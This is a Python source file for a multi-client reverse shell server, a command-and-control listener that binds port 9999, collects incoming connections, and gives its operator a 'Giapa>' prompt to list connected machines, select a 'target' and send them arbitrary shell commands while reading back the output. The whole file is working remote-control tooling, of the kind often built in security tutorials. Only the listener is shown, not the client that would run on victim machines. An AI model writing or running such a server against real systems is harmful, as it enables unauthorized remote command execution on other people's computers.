import socket
import threading
import time
from queue import Queue

number_of_threads = 2
job_number = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

#create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creationg error: " + str(msg))

#bind socket to a port
def socket_bind():
    try:
        global host
        global port
        global s
        print("Bindding socket to port: "+ str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying.....")
        time.sleep(5)
        socket_bind()

# Accept multiclients and save to list
def socket_connections():
    for i in all_connections:
        i.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established: " + address[0])
        except:
            print("Error accepting connections")    

# Interactive prompt for sending commands remotely
def start_giapa():
    while True:
        cmd = input('Giapa> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised")

#show connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            #testing if we get response after sending 
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '    ' + str(all_addresses[i][1]) + '\n'
    print('----- Clients------' + '\n' + results)

#Select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        print("Now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+ "> ",end="")
        return conn
    except:
        print("Not a valid selection")  
        return None

#Sending the commands to the target machine 
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"utf-8")
                print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break

#Create worker threads
def create_workers():
    for _ in range(number_of_threads):
        t = threading.Thread(target=work)
        t.daemon = True #thread is gonna die when program exits
        t.start()

#Do the next job in the queue(one handles connections,second sends command)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            socket_connections()
        if x == 2:
            start_giapa()
        queue.task_done()

# Each list item is a new job
def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()